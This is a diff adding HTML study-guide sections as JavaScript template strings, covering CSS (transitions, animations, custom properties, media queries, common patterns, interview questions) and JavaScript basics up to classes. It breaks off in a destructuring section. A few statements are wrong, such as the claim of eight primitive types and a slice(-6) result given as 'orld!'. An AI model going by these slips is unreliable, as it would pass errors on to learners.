+<p>Transitions animate property changes smoothly.</p>
+<pre><code>.btn {
+  background: blue;
+  color: white;
+  padding: 10px 20px;
+
+  /* Transition shorthand: property duration timing-function delay */
+  transition: background 0.3s ease, transform 0.2s ease-out;
+  transition: all 0.3s ease;      /* Transition all properties */
+}
+
+.btn:hover {
+  background: darkblue;
+  transform: translateY(-2px);
+}
+
+/* Timing functions */
+.timing {
+  transition-timing-function: linear;         /* Constant speed */
+  transition-timing-function: ease;           /* Fast start, slow end (default) */
+  transition-timing-function: ease-in;        /* Slow start */
+  transition-timing-function: ease-out;       /* Slow end */
+  transition-timing-function: ease-in-out;    /* Slow start and end */
+  transition-timing-function: cubic-bezier(0.68, -0.55, 0.265, 1.55); /* Spring */
+  transition-timing-function: steps(5, end); /* Stepped animation */
+}
+
+/* Delays for staggered effects */
+.item-1 { transition-delay: 0s; }
+.item-2 { transition-delay: 0.1s; }
+.item-3 { transition-delay: 0.2s; }
+</code></pre>
+
+`,
+  "study-guide-css-15": `
+<h2>15. CSS Animations</h2>
+<p>Animations are more powerful than transitions — they can loop, use keyframes, and run without user interaction.</p>
+<pre><code>/* Define keyframes */
+@keyframes slideIn {
+  from {
+    transform: translateX(-100%);
+    opacity: 0;
+  }
+  to {
+    transform: translateX(0);
+    opacity: 1;
+  }
+}
+
+@keyframes bounce {
+  0%, 100% { transform: translateY(0); }
+  25%       { transform: translateY(-20px); }
+  50%       { transform: translateY(0); }
+  75%       { transform: translateY(-10px); }
+}
+
+@keyframes colorShift {
+  0%   { background-color: red; }
+  33%  { background-color: yellow; }
+  66%  { background-color: green; }
+  100% { background-color: red; }
+}
+
+/* Apply animation */
+.animated-element {
+  animation-name: slideIn;
+  animation-duration: 0.5s;
+  animation-timing-function: ease-out;
+  animation-delay: 0.2s;
+  animation-iteration-count: 1;        /* or infinite */
+  animation-direction: normal;          /* normal, reverse, alternate, alternate-reverse */
+  animation-fill-mode: both;           /* none, forwards, backwards, both */
+  animation-play-state: running;        /* running, paused */
+
+  /* Shorthand: name duration timing delay iterations direction fill-mode */
+  animation: slideIn 0.5s ease-out 0.2s 1 normal both;
+
+  /* Multiple animations */
+  animation: slideIn 0.5s ease, colorShift 2s linear infinite;
+}
+</code></pre>
+
+`,
+  "study-guide-css-16": `
+<h2>16. CSS Variables (Custom Properties)</h2>
+<pre><code>/* Define at :root for global access */
+:root {
+  --color-primary: #6366f1;
+  --color-primary-dark: #4f46e5;
+  --color-text: #1e293b;
+  --color-bg: #f8fafc;
+  --spacing-sm: 8px;
+  --spacing-md: 16px;
+  --spacing-lg: 32px;
+  --font-size-base: 16px;
+  --border-radius: 8px;
+  --shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
+}
+
+/* Use variables */
+.btn {
+  background-color: var(--color-primary);
+  padding: var(--spacing-sm) var(--spacing-md);
+  border-radius: var(--border-radius);
+  box-shadow: var(--shadow);
+}
+
+.btn:hover {
+  background-color: var(--color-primary-dark);
+}
+
+/* Fallback value if variable undefined */
+.element {
+  color: var(--text-color, black);
+}
+
+/* Override at component level */
+.dark-theme {
+  --color-bg: #1e1e2e;
+  --color-text: #cdd6f4;
+}
+
+/* Variables in media queries */
+@media (prefers-color-scheme: dark) {
+  :root {
+    --color-bg: #1a1a2e;
+    --color-text: #e2e8f0;
+  }
+}
+</code></pre>
+
+`,
+  "study-guide-css-17": `
+<h2>17. Responsive Design and Media Queries</h2>
+<pre><code>/* Mobile-first approach (recommended) */
+/* Base styles target small screens, then override for larger */
+
+.container {
+  width: 100%;
+  padding: 0 16px;
+}
+
+/* Small tablets and up (≥ 640px) */
+@media (min-width: 640px) {
+  .container {
+    max-width: 640px;
+    margin: 0 auto;
+  }
+}
+
+/* Tablets and up (≥ 768px) */
+@media (min-width: 768px) {
+  .container { max-width: 768px; }
+  .grid { grid-template-columns: repeat(2, 1fr); }
+}
+
+/* Laptops and up (≥ 1024px) */
+@media (min-width: 1024px) {
+  .container { max-width: 1024px; }
+  .grid { grid-template-columns: repeat(3, 1fr); }
+}
+
+/* Large desktops (≥ 1280px) */
+@media (min-width: 1280px) {
+  .container { max-width: 1280px; }
+}
+
+/* Max-width (desktop-first) */
+@media (max-width: 767px) {
+  .nav-links { display: none; }
+}
+
+/* Combined range */
+@media (min-width: 768px) and (max-width: 1023px) {
+  .sidebar { width: 200px; }
+}
+
+/* Orientation */
+@media (orientation: landscape) { ... }
+@media (orientation: portrait) { ... }
+
+/* Device features */
+@media (prefers-color-scheme: dark) {
+  body { background: #1a1a1a; color: #fff; }
+}
+
+@media (prefers-reduced-motion: reduce) {
+  * {
+    animation-duration: 0.01ms !important;
+    transition-duration: 0.01ms !important;
+  }
+}
+
+@media (hover: none) {
+  /* Touch devices — no hover */
+  .hover-effect { display: none; }
+}
+
+@media print {
+  nav, footer, .sidebar { display: none; }
+  body { font-size: 12pt; color: black; }
+  a::after { content: " (" attr(href) ")"; }
+}
+</code></pre>
+<h3>Responsive Units</h3>
+<table>
+<thead>
+<tr>
+<th>Unit</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>px</code></td>
+<td>Fixed pixels</td>
+</tr>
+<tr>
+<td><code>%</code></td>
+<td>Percentage of parent</td>
+</tr>
+<tr>
+<td><code>em</code></td>
+<td>Relative to element's own font-size</td>
+</tr>
+<tr>
+<td><code>rem</code></td>
+<td>Relative to root <code>&lt;html&gt;</code> font-size</td>
+</tr>
+<tr>
+<td><code>vw</code></td>
+<td>1% of viewport width</td>
+</tr>
+<tr>
+<td><code>vh</code></td>
+<td>1% of viewport height</td>
+</tr>
+<tr>
+<td><code>vmin</code></td>
+<td>1% of smaller viewport dimension</td>
+</tr>
+<tr>
+<td><code>vmax</code></td>
+<td>1% of larger viewport dimension</td>
+</tr>
+<tr>
+<td><code>ch</code></td>
+<td>Width of "0" character</td>
+</tr>
+<tr>
+<td><code>fr</code></td>
+<td>Fractional unit (Grid only)</td>
+</tr>
+<tr>
+<td><code>clamp()</code></td>
+<td><code>clamp(min, preferred, max)</code></td>
+</tr>
+</tbody>
+</table>
+<pre><code>/* Fluid typography with clamp() */
+h1 { font-size: clamp(1.5rem, 5vw, 3rem); }
+
+/* Fluid container */
+.container {
+  width: min(90%, 1200px);
+  margin: 0 auto;
+}
+</code></pre>
+
+`,
+  "study-guide-css-18": `
+<h2>18. CSS Architecture Patterns</h2>
+<h3>BEM (Block Element Modifier)</h3>
+<pre><code>/* Block */
+.card { }
+/* Element */
+.card__header { }
+.card__body { }
+.card__footer { }
+/* Modifier */
+.card--featured { }
+.card--dark { }
+.card__btn--large { }
+</code></pre>
+<h3>Utility Classes (like Tailwind)</h3>
+<pre><code>.text-center { text-align: center; }
+.text-red    { color: red; }
+.mt-4        { margin-top: 16px; }
+.flex        { display: flex; }
+.hidden      { display: none; }
+</code></pre>
+
+`,
+  "study-guide-css-19": `
+<h2>19. Common CSS Patterns and Tricks</h2>
+<pre><code>/* Sticky footer */
+body {
+  display: flex;
+  flex-direction: column;
+  min-height: 100vh;
+}
+main { flex: 1; }
+
+/* Centered div (modern) */
+.center {
+  display: grid;
+  place-items: center;
+}
+
+/* Aspect ratio box */
+.video-wrapper {
+  aspect-ratio: 16 / 9;
+}
+
+/* Smooth scrolling */
+html { scroll-behavior: smooth; }
+
+/* CSS Reset essentials */
+*, *::before, *::after { box-sizing: border-box; }
+* { margin: 0; padding: 0; }
+img, video { max-width: 100%; height: auto; display: block; }
+
+/* Visually hidden (accessible) */
+.sr-only {
+  position: absolute;
+  width: 1px; height: 1px;
+  padding: 0; margin: -1px;
+  overflow: hidden;
+  clip: rect(0,0,0,0);
+  border: 0;
+}
+
+/* Custom scrollbar */
+::-webkit-scrollbar { width: 8px; }
+::-webkit-scrollbar-track { background: #f1f1f1; }
+::-webkit-scrollbar-thumb { background: #888; border-radius: 4px; }
+
+/* Selection color */
+::selection { background: #6366f1; color: white; }
+
+/* Overlay */
+.overlay {
+  position: fixed;
+  inset: 0;   /* shorthand for top:0 right:0 bottom:0 left:0 */
+  background: rgba(0,0,0,0.5);
+}
+</code></pre>
+
+`,
+  "study-guide-css-20": `
+<h2>20. CSS Interview Questions</h2>
+<p><strong>Q: What is the difference between <code>em</code> and <code>rem</code>?</strong>
+A: <code>em</code> is relative to the element's own font-size (compound with nesting). <code>rem</code> is relative to the root <code>&lt;html&gt;</code> font-size (consistent).</p>
+<p><strong>Q: Explain the CSS box model. What does <code>box-sizing: border-box</code> do?</strong>
+A: Content + Padding + Border + Margin. By default (<code>content-box</code>), width applies to content only. <code>border-box</code> makes width include padding and border, making layouts more predictable.</p>
+<p><strong>Q: What is specificity and how is it calculated?</strong>
+A: A score system determining which CSS rule applies. Inline styles (1000) &gt; IDs (100) &gt; Classes/Attributes/Pseudo-classes (10) &gt; Elements/Pseudo-elements (1).</p>
+<p><strong>Q: What is the difference between <code>display: none</code> and <code>visibility: hidden</code>?</strong>
+A: <code>display: none</code> removes the element from the layout (takes no space). <code>visibility: hidden</code> makes it invisible but it still takes up space.</p>
+<p><strong>Q: What is a CSS variable and how do you use one?</strong>
+A: Custom properties defined with <code>--name: value;</code> and used with <code>var(--name)</code>. Defined on <code>:root</code> for global use, or on any element to scope them.</p>
+<p><strong>Q: What is the difference between <code>position: absolute</code> and <code>position: fixed</code>?</strong>
+A: <code>absolute</code> positions relative to the nearest non-static ancestor. <code>fixed</code> positions relative to the viewport — stays on screen when scrolling.</p>
+
+<p><em>End of CSS Study Guide</em></p>
+
+`,
+  "study-guide-js-01": `
+<h2>1. What Is JavaScript?</h2>
+<p>JavaScript is a <strong>high-level, interpreted, dynamically typed</strong> programming language that runs in browsers and (via Node.js) on servers. It is the only native programming language of the web, enabling interactivity, DOM manipulation, data fetching, and full-stack development.</p>
+<p>Key characteristics:</p>
+<ul>
+<li><strong>Dynamically typed</strong> — variables can hold any type</li>
+<li><strong>Prototype-based</strong> object orientation</li>
+<li><strong>First-class functions</strong> — functions are values</li>
+<li><strong>Event-driven</strong> and asynchronous</li>
+<li><strong>Single-threaded</strong> with an event loop</li>
+</ul>
+
+`,
+  "study-guide-js-02": `
+<h2>2. Including JavaScript</h2>
+<pre><code>&lt;!-- Inline (avoid for large code) --&gt;
+&lt;script&gt;
+  console.log("Hello!");
+&lt;/script&gt;
+
+&lt;!-- External (preferred) --&gt;
+&lt;script src="script.js" defer&gt;&lt;/script&gt;
+
+&lt;!-- At end of body (old approach) --&gt;
+&lt;body&gt;
+  ...
+  &lt;script src="script.js"&gt;&lt;/script&gt;
+&lt;/body&gt;
+</code></pre>
+
+`,
+  "study-guide-js-03": `
+<h2>3. Variables</h2>
+<pre><code>// var: function-scoped, hoisted, re-declarable (avoid in modern JS)
+var name = "Alice";
+var name = "Bob";  // OK — no error
+
+// let: block-scoped, not re-declarable (preferred for mutable)
+let age = 25;
+age = 26;    // OK — reassignable
+// let age = 27;  // Error — cannot redeclare
+
+// const: block-scoped, must be initialized, cannot be reassigned
+const PI = 3.14159;
+// PI = 3;  // Error — cannot reassign
+
+// const with objects/arrays: the reference is const, not the value
+const user = { name: "Alice" };
+user.name = "Bob";   // OK — mutating the object
+user.age = 25;       // OK — adding property
+// user = {};        // Error — cannot reassign
+
+const arr = [1, 2, 3];
+arr.push(4);          // OK — mutating the array
+// arr = [5, 6];      // Error
+
+// Naming conventions
+let camelCase = "standard for variables and functions";
+let UPPER_SNAKE = "for constants";
+let PascalCase = "for classes";
+let _private = "convention for private members";
+</code></pre>
+
+`,
+  "study-guide-js-04": `
+<h2>4. Data Types</h2>
+<p>JavaScript has <strong>8 primitive types</strong> + <strong>objects</strong>:</p>
+<pre><code>// Primitives (immutable values)
+let num1 = 42;                // Number (integers and floats are same type)
+let float1 = 3.14;
+let bigInt = 9007199254740991n; // BigInt (suffix n)
+let str = "Hello";            // String
+let str2 = 'World';
+let template = \`Hello, \${str2}!\`; // Template literal
+let bool = true;              // Boolean
+let nothing = null;           // Null (intentional absence)
+let unknown = undefined;      // Undefined (not yet assigned)
+let sym = Symbol("id");       // Symbol (unique identifier)
+
+// Object types (mutable)
+let obj = { key: "value" };  // Object
+let arr = [1, 2, 3];         // Array (special object)
+let fn = function() {};       // Function (callable object)
+let date = new Date();        // Date
+let re = /pattern/g;          // RegExp
+
+// Type checking
+typeof 42          // "number"
+typeof "hello"     // "string"
+typeof true        // "boolean"
+typeof undefined   // "undefined"
+typeof null        // "object"  ← HISTORICAL BUG in JS
+typeof {}          // "object"
+typeof []          // "object"
+typeof function(){} // "function"
+typeof Symbol()    // "symbol"
+typeof 42n         // "bigint"
+
+// Better type checks
+Array.isArray([])              // true
+obj instanceof Date            // true
+Object.prototype.toString.call([]) // "[object Array]"
+</code></pre>
+<h3>Type Coercion</h3>
+<pre><code>// Implicit coercion (JS automatically converts types)
+"5" + 3        // "53" (number converted to string)
+"5" - 3        // 2   (string converted to number)
+"5" * "3"      // 15
+true + 1       // 2   (true = 1)
+false + 1      // 1   (false = 0)
+null + 1       // 1   (null = 0)
+undefined + 1  // NaN (undefined can't convert)
+
+// Explicit conversion
+Number("42")     // 42
+Number("hello")  // NaN
+Number(true)     // 1
+Number(null)     // 0
+Number(undefined)// NaN
+
+String(42)       // "42"
+String(true)     // "true"
+String(null)     // "null"
+
+Boolean(0)       // false
+Boolean("")      // false
+Boolean(null)    // false
+Boolean(undefined) // false
+Boolean(NaN)     // false
+Boolean(false)   // false
+// Everything else is truthy!
+
+parseInt("42px")  // 42 (parses until non-number)
+parseFloat("3.14abc") // 3.14
+
+// Equality
+5 == "5"     // true  (loose: converts types)
+5 === "5"    // false (strict: no conversion)
+null == undefined   // true
+null === undefined  // false
+// ALWAYS use === in practice
+</code></pre>
+
+`,
+  "study-guide-js-05": `
+<h2>5. Strings</h2>
+<pre><code>const str = "Hello, World!";
+
+// Properties
+str.length        // 13
+
+// Methods
+str.toUpperCase()             // "HELLO, WORLD!"
+str.toLowerCase()             // "hello, world!"
+str.trim()                    // Remove whitespace from both ends
+str.trimStart()               // Remove from start
+str.trimEnd()                 // Remove from end
+str.includes("World")         // true
+str.startsWith("Hello")       // true
+str.endsWith("!")             // true
+str.indexOf("o")              // 4 (first occurrence)
+str.lastIndexOf("o")          // 8 (last occurrence)
+str.slice(7, 12)              // "World" (start, end-exclusive)
+str.slice(-6)                 // "orld!" (from end)
+str.substring(7, 12)          // "World" (like slice, no negatives)
+str.split(", ")               // ["Hello", "World!"]
+str.replace("World", "JS")    // "Hello, JS!" (first occurrence)
+str.replaceAll("l", "L")      // "HeLLo, WorLd!"
+str.repeat(2)                 // "Hello, World!Hello, World!"
+str.padStart(15, "0")         // "00Hello, World!"
+str.padEnd(15, ".")           // "Hello, World!.."
+str.charAt(0)                 // "H"
+str.charCodeAt(0)             // 72 (ASCII code)
+str[0]                        // "H" (bracket notation)
+
+// Template literals
+const name = "Alice";
+const age = 25;
+const intro = \`Name: \${name}, Age: \${age}\`;
+const math = \`Result: \${2 + 2}\`;
+const multi = \`
+  Line 1
+  Line 2
+  Line 3
+\`;
+
+// Regular expressions with strings
+str.match(/[A-Z]/g)           // ["H", "W"]
+str.search(/World/)           // 7 (index)
+str.replace(/o/g, "0")        // "Hell0, W0rld!"
+</code></pre>
+
+`,
+  "study-guide-js-06": `
+<h2>6. Numbers and Math</h2>
+<pre><code>const num = 42;
+const float = 3.14159;
+
+// Special values
+Infinity        // Positive infinity
+-Infinity       // Negative infinity
+NaN             // Not a Number
+Number.MAX_SAFE_INTEGER   // 9007199254740991
+Number.MIN_SAFE_INTEGER   // -9007199254740991
+Number.MAX_VALUE          // ~1.8e308
+Number.EPSILON            // ~2.2e-16
+
+// Number methods
+(3.14159).toFixed(2)      // "3.14" (string!)
+(1000000).toLocaleString() // "1,000,000"
+(255).toString(16)         // "ff" (hex)
+(255).toString(2)          // "11111111" (binary)
+Number.isInteger(42)       // true
+Number.isFinite(Infinity)  // false
+Number.isNaN(NaN)          // true — better than global isNaN()
+Number.parseInt("42px")    // 42
+Number.parseFloat("3.14x") // 3.14
+
+// Math object
+Math.PI            // 3.141592...
+Math.E             // 2.718...
+Math.abs(-5)       // 5
+Math.round(4.5)    // 5
+Math.floor(4.9)    // 4
+Math.ceil(4.1)     // 5
+Math.trunc(4.9)    // 4 (remove decimal)
+Math.max(1, 5, 3)  // 5
+Math.min(1, 5, 3)  // 1
+Math.pow(2, 10)    // 1024
+Math.sqrt(16)      // 4
+Math.cbrt(27)      // 3
+Math.log(Math.E)   // 1
+Math.log2(8)       // 3
+Math.log10(1000)   // 3
+Math.sign(-5)      // -1
+Math.sign(0)       // 0
+Math.sign(5)       // 1
+Math.random()      // 0 to 0.999...
+
+// Random integer between min and max (inclusive)
+function randInt(min, max) {
+  return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+// Rounding issues (floating point!)
+0.1 + 0.2 === 0.3  // FALSE — 0.30000000000000004
+Math.abs(0.1 + 0.2 - 0.3) &lt; Number.EPSILON  // TRUE — correct comparison
+</code></pre>
+
+`,
+  "study-guide-js-07": `
+<h2>7. Operators</h2>
+<pre><code>// Arithmetic
++   -   *   /   %   **        // Add, sub, mul, div, modulo, exponent
+10 % 3    // 1 (remainder)
+2 ** 10   // 1024
+
+// Assignment
+=   +=   -=   *=   /=   %=   **=
+x += 5   // x = x + 5
+
+// Comparison (always use === and !==)
+==  !=    // Loose (avoid)
+=== !==   // Strict (use these)
+&lt;   &gt;   &lt;=   &gt;=
+
+// Logical
+&amp;&amp;    // AND
+||    // OR
+!     // NOT
+??    // Nullish coalescing
+
+// Ternary
+let result = condition ? valueIfTrue : valueIfFalse;
+let status = age &gt;= 18 ? "adult" : "minor";
+
+// Nullish coalescing (??)
+// Returns right side only if left is null or undefined
+let name = user.name ?? "Guest";   // If null/undefined, use "Guest"
+// vs OR (returns right side for ANY falsy value)
+let name2 = user.name || "Guest";  // If "", 0, false, null, undefined
+
+// Optional chaining (?.)
+let city = user?.address?.city;    // undefined if any step is null/undefined
+let fn = obj?.method?.();          // Call only if method exists
+let item = arr?.[0];               // Array access
+
+// Logical assignment
+x &amp;&amp;= y   // x = x &amp;&amp; y   (assign only if x is truthy)
+x ||= y   // x = x || y   (assign only if x is falsy)
+x ??= y   // x = x ?? y   (assign only if x is null/undefined)
+
+// Bitwise operators
+&amp;     // AND
+|     // OR
+^     // XOR
+~     // NOT (bitwise)
+&lt;&lt;    // Left shift
+&gt;&gt;    // Right shift
+&gt;&gt;&gt;   // Unsigned right shift
+
+// Spread operator
+const arr2 = [...arr1, 4, 5];        // Spread array
+const obj2 = { ...obj1, c: 3 };      // Spread object
+function sum(...nums) { ... }         // Rest parameter
+
+// Comma operator
+let x = (1, 2, 3);   // x = 3 (evaluates all, returns last)
+
+// Delete operator
+delete obj.property;  // Removes property from object
+
+// typeof and instanceof
+typeof value
+value instanceof Constructor
+
+// void operator
+void 0        // undefined — used as "undefined" in older code
+void expr     // Evaluates expr but returns undefined
+</code></pre>
+
+`,
+  "study-guide-js-08": `
+<h2>8. Control Flow</h2>
+<h3>Conditionals</h3>
+<pre><code>// if / else if / else
+if (score &gt;= 90) {
+  grade = "A";
+} else if (score &gt;= 80) {
+  grade = "B";
+} else if (score &gt;= 70) {
+  grade = "C";
+} else {
+  grade = "F";
+}
+
+// switch
+switch (day) {
+  case "Monday":
+  case "Tuesday":
+    console.log("Weekday");
+    break;
+  case "Saturday":
+  case "Sunday":
+    console.log("Weekend");
+    break;
+  default:
+    console.log("Unknown");
+}
+
+// Ternary (for simple cases)
+const message = isLoggedIn ? "Welcome back!" : "Please log in";
+
+// Nullish coalescing for defaults
+const port = config.port ?? 3000;
+</code></pre>
+<h3>Loops</h3>
+<pre><code>// for loop
+for (let i = 0; i &lt; 10; i++) {
+  if (i === 5) break;       // Exit loop
+  if (i % 2 === 0) continue; // Skip to next iteration
+  console.log(i);
+}
+
+// while loop
+let n = 0;
+while (n &lt; 10) {
+  n++;
+}
+
+// do...while (executes at least once)
+do {
+  input = prompt("Enter a number:");
+} while (isNaN(input));
+
+// for...of (iterate over iterable values: arrays, strings, Sets, Maps)
+const fruits = ["apple", "banana", "cherry"];
+for (const fruit of fruits) {
+  console.log(fruit);
+}
+
+for (const char of "hello") {
+  console.log(char);  // h, e, l, l, o
+}
+
+// for...in (iterate over object KEYS — use with caution on arrays)
+const user = { name: "Alice", age: 25, city: "NYC" };
+for (const key in user) {
+  console.log(\`\${key}: \${user[key]}\`);
+}
+
+// Labeled statements (for nested loop control)
+outer: for (let i = 0; i &lt; 3; i++) {
+  for (let j = 0; j &lt; 3; j++) {
+    if (j === 1) break outer;  // Break outer loop
+  }
+}
+</code></pre>
+
+`,
+  "study-guide-js-09": `
+<h2>9. Functions</h2>
+<pre><code>// Function declaration (hoisted — can call before definition)
+function greet(name) {
+  return \`Hello, \${name}!\`;
+}
+
+// Function expression (NOT hoisted)
+const greet = function(name) {
+  return \`Hello, \${name}!\`;
+};
+
+// Arrow function (concise, lexical this)
+const greet = (name) =&gt; \`Hello, \${name}!\`;
+const square = n =&gt; n * n;           // Single param: no parens needed
+const add = (a, b) =&gt; a + b;
+const getObj = (a) =&gt; ({ value: a }); // Return object: wrap in parens
+
+// Arrow function with body
+const process = (data) =&gt; {
+  const cleaned = data.trim();
+  const result = cleaned.toUpperCase();
+  return result;
+};
+
+// Default parameters
+function createUser(name, role = "user", active = true) {
+  return { name, role, active };
+}
+createUser("Alice");           // { name: "Alice", role: "user", active: true }
+createUser("Bob", "admin");    // { name: "Bob", role: "admin", active: true }
+
+// Rest parameters (gather remaining args into array)
+function sum(...numbers) {
+  return numbers.reduce((acc, n) =&gt; acc + n, 0);
+}
+sum(1, 2, 3, 4, 5);  // 15
+
+// Spread in function calls
+const nums = [1, 2, 3];
+Math.max(...nums);      // Same as Math.max(1, 2, 3)
+
+// Arguments object (old style — avoid in modern JS)
+function old() {
+  console.log(arguments);  // Array-like object
+}
+
+// Immediately Invoked Function Expression (IIFE)
+(function() {
+  console.log("Runs immediately!");
+})();
+
+// Recursive function
+function factorial(n) {
+  if (n &lt;= 1) return 1;
+  return n * factorial(n - 1);
+}
+
+// Pure functions (no side effects, same input = same output)
+const double = (n) =&gt; n * 2;  // Pure
+
+// Higher-order functions
+function applyToAll(arr, fn) {
+  return arr.map(fn);
+}
+applyToAll([1, 2, 3], n =&gt; n * 2);  // [2, 4, 6]
+
+// Closures: inner function remembers outer scope
+function makeCounter(start = 0) {
+  let count = start;
+  return {
+    increment: () =&gt; ++count,
+    decrement: () =&gt; --count,
+    value: () =&gt; count,
+    reset: () =&gt; { count = start; }
+  };
+}
+const counter = makeCounter(10);
+counter.increment();  // 11
+counter.increment();  // 12
+counter.value();      // 12
+</code></pre>
+
+`,
+  "study-guide-js-10": `
+<h2>10. Arrays</h2>
+<pre><code>// Creation
+const arr = [1, 2, 3, 4, 5];
+const arr2 = new Array(5);              // [empty × 5]
+const arr3 = new Array(1, 2, 3);       // [1, 2, 3]
+const arr4 = Array.from({ length: 5 }, (_, i) =&gt; i + 1);  // [1,2,3,4,5]
+const arr5 = Array.from("hello");      // ["h","e","l","l","o"]
+const arr6 = Array.of(1, 2, 3);       // [1, 2, 3]
+
+// Access and modification
+arr[0]             // 1 (first)
+arr[arr.length-1]  // 5 (last)
+arr.at(-1)         // 5 (modern — negative index from end)
+arr.at(-2)         // 4
+
+// Mutating methods (modify original array)
+arr.push(6)        // Add to end; returns new length
+arr.pop()          // Remove from end; returns removed element
+arr.unshift(0)     // Add to beginning; returns new length
+arr.shift()        // Remove from beginning; returns removed element
+arr.splice(1, 2)        // Remove 2 elements starting at index 1; returns removed
+arr.splice(1, 0, "a")   // Insert "a" at index 1, remove 0
+arr.splice(1, 1, "b")   // Replace element at index 1 with "b"
+arr.reverse()      // Reverses in place
+arr.sort()         // Sorts in place (default: string sort!)
+arr.sort((a, b) =&gt; a - b)   // Numeric ascending
+arr.sort((a, b) =&gt; b - a)   // Numeric descending
+arr.sort((a, b) =&gt; a.name.localeCompare(b.name))  // By string property
+arr.fill(0)        // Fill entire array with 0
+arr.fill(0, 2, 4)  // Fill indices 2-3 with 0
+arr.copyWithin(0, 3) // Copy elements from index 3 to position 0
+
+// Non-mutating methods (return new array/value)
+arr.slice(1, 3)        // [2, 3] — elements from 1 to 3 (exclusive)
+arr.concat([6, 7])     // Merge arrays
+arr.join(" - ")        // "1 - 2 - 3 - 4 - 5"
+arr.flat()             // Flatten one level: [[1,2],[3,4]] → [1,2,3,4]
+arr.flat(Infinity)     // Flatten all levels
+arr.flatMap(n =&gt; [n, n*2])  // Map then flat one level
+[...arr]               // Shallow copy
+
+// Search
+arr.includes(3)        // true
+arr.indexOf(3)         // 2
+arr.lastIndexOf(3)     // 2
+arr.find(n =&gt; n &gt; 3)   // 4 (first match)
+arr.findIndex(n =&gt; n &gt; 3) // 3
+arr.findLast(n =&gt; n &lt; 4)  // 3 (from end)
+arr.findLastIndex(n =&gt; n &lt; 4) // 2
+
+// Iteration
+arr.forEach(n =&gt; console.log(n));
+arr.map(n =&gt; n * 2)           // [2, 4, 6, 8, 10] — transform
+arr.filter(n =&gt; n % 2 === 0)  // [2, 4] — keep matching
+arr.reduce((acc, n) =&gt; acc + n, 0)  // 15 — accumulate
+arr.reduceRight((acc, n) =&gt; acc + n, 0)  // Same but right to left
+arr.every(n =&gt; n &gt; 0)         // true — ALL match
+arr.some(n =&gt; n &gt; 4)          // true — AT LEAST ONE matches
+
+// Destructuring
+const [first, second, ...rest] = [1, 2, 3, 4, 5];
+// first=1, second=2, rest=[3,4,5]
+
+const [a, , b] = [1, 2, 3];  // Skip element: a=1, b=3
+const [x = 10] = [];          // Default: x=10
+
+// Spread
+const combined = [...arr1, ...arr2];
+const copy = [...arr];
+
+// Useful patterns
+const unique = [...new Set(arr)];           // Remove duplicates
+const sorted = [...arr].sort((a,b) =&gt; a-b); // Sort without mutation
+const chunked = arr.reduce((chunks, item, i) =&gt;
+  (i % 3 === 0 ? chunks.push([item]) : chunks[chunks.length-1].push(item), chunks), []);
+</code></pre>
+
+`,
+  "study-guide-js-11": `
+<h2>11. Objects</h2>
+<pre><code>// Object literal
+const user = {
+  name: "Alice",
+  age: 25,
+  "full name": "Alice Smith",  // Quoted key
+  greet() {                    // Method shorthand
+    return \`Hi, I'm \${this.name}\`;
+  }
+};
+
+// Property access
+user.name            // "Alice"
+user["name"]         // "Alice" — use for dynamic keys or special chars
+user["full name"]    // "Alice Smith"
+
+// Dynamic key
+const key = "name";
+user[key]            // "Alice"
+
+// Property existence
+"name" in user       // true
+user.hasOwnProperty("name")  // true (not inherited)
+Object.hasOwn(user, "name")  // Modern version
+
+// Delete property
+delete user.age;
+
+// Object methods
+Object.keys(user)           // ["name", "greet"]
+Object.values(user)         // ["Alice", function]
+Object.entries(user)        // [["name","Alice"], ["greet", fn]]
+Object.fromEntries([["a",1],["b",2]])  // { a:1, b:2 }
+
+Object.assign(target, source1, source2)   // Merge (shallow)
+Object.assign({}, user)                    // Shallow copy
+const copy = Object.assign({}, user);
+
+// Spread (same as assign)
+const copy2 = { ...user };
+const updated = { ...user, age: 26 };   // Overwrite age
+
+Object.freeze(obj)     // Make immutable (shallow)
+Object.seal(obj)       // Allow modifying, not adding/deleting
+Object.isFrozen(obj)
+Object.isSealed(obj)
+
+Object.create(proto)   // Create object with given prototype
+Object.getPrototypeOf(obj)
+Object.setPrototypeOf(obj, proto)
+
+Object.defineProperty(obj, "key", {
+  value: 42,
+  writable: false,
+  enumerable: true,
+  configurable: false
+});
+
+Object.getOwnPropertyNames(obj)   // All own properties including non-enumerable
+
+// Destructuring
+const { name, age, city = "NYC" } = user;   // city defaults to "NYC"
+const { name: fullName } = user;             // Rename to fullName
+
+// Nested
+const { address: { street } } = user;
+const { address: { street: s = "N/A" } } = user;
+
+// In function parameters
+function displayUser({ name, age = 0 }) {
+  console.log(\`\${name}: \${age}\`);
+}
+
+// Computed property names
+const propName = "score";
+const obj = { [propName]: 100, [\`\${propName}_max\`]: 200 };
+</code></pre>
+
+`,
+  "study-guide-js-12": `
+<h2>12. Classes</h2>
+<pre><code>class Animal {
+  // Private field (new syntax)
+  #name;
+  #sound;
+  static count = 0;   // Static property
+
+  constructor(name, sound) {
+    this.#name = name;
+    this.#sound = sound;
+    Animal.count++;
+  }
+
+  // Instance method
+  speak() {
+    return \`\${this.#name} says \${this.#sound}!\`;
+  }
+
+  // Getter
+  get name() {
+    return this.#name;
+  }
+
+  // Setter
+  set name(value) {
+    if (typeof value !== "string") throw new TypeError("Name must be a string");
+    this.#name = value;
+  }
+
+  // Static method (called on class, not instances)
+  static create(name, sound) {
+    return new Animal(name, sound);
+  }
+
+  // Override toString
+  toString() {
+    return \`[Animal: \${this.#name}]\`;
+  }
+}
+
+class Dog extends Animal {
+  #tricks = [];
+
+  constructor(name) {
+    super(name, "Woof");  // Call parent constructor (required before using this)
+  }
+
+  learn(trick) {
+    this.#tricks.push(trick);
+    return this;  // Enable chaining
+  }
+
+  perform() {
+    return this.#tricks.map(t =&gt; \`\${this.name} performs: \${t}\`);
+  }
+
+  // Override parent method
+  speak() {
+    return super.speak() + " *wags tail*";
+  }
+}
+
+const dog = new Dog("Rex");
+dog.learn("sit").learn("shake");
+console.log(dog.speak());
+console.log(dog.perform());
+console.log(dog instanceof Dog);    // true
+console.log(dog instanceof Animal); // true
+console.log(Animal.count);          // number of animals created
+</code></pre>
+
+`,
+  "study-guide-js-13": `
+<h2>13. Destructuring and Spread (Advanced)</h2>
+<pre><code>// Swap variables
+let a = 1, b = 2;
+[a, b] = [b, a];   // a=2, b=1
+
+// Function returning multiple values
+function getMinMax(arr) {
+  return [Math.min(...arr), Math.max(...arr)];
+}
+const [min, max] = getMinMax([3,1,4,1,5,9]);
+
